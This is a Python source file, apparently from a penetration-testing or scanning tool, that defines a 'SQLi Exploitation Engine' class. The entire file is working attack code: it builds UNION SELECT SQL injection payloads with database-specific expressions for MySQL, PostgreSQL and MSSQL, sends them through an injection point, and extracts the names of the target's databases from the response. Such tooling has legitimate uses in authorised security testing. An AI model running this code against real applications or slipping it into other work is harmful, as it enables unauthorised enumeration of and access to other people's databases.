import re


class SQLiExploitEngine:
    """
    Phase 17 â€” Controlled SQLi Exploitation Engine
    """

    MAX_SAMPLE_ROWS = 5

    def __init__(self, requester):
        self.requester = requester

    def list_databases(self, point, col_count, inj_col, dbms="mysql"):
        expr = self._db_enum_expr(dbms)
        if not expr:
            return []

        payload = self._union_payload(col_count, inj_col, expr)
        r = self.requester.send(point.inject(payload))
        return self._parse(r.text) if r else []

    def _union_payload(self, col_count, inj_col, expr):
        cols = ["NULL"] * col_count
        cols[inj_col - 1] = expr
        return f" UNION SELECT {','.join(cols)}-- "

    def _db_enum_expr(self, dbms):
        dbms = (dbms or "").lower()

        if dbms in ("mysql", "mariadb"):
            return "GROUP_CONCAT(schema_name) FROM information_schema.schemata"

        if dbms == "postgresql":
            return "string_agg(datname, ',') FROM pg_database"

        if dbms == "mssql":
            return "name FROM master..sysdatabases"

        return None

    def _parse(self, text):
        if not text:
            return []

        tokens = re.findall(r"[a-zA-Z0-9_@.\-]{2,}", text)
        blacklist = {
            "null", "select", "from", "where", "union",
            "html", "body", "script", "div", "span"
        }

        return sorted({
            t for t in tokens
            if t.lower() not in blacklist
        })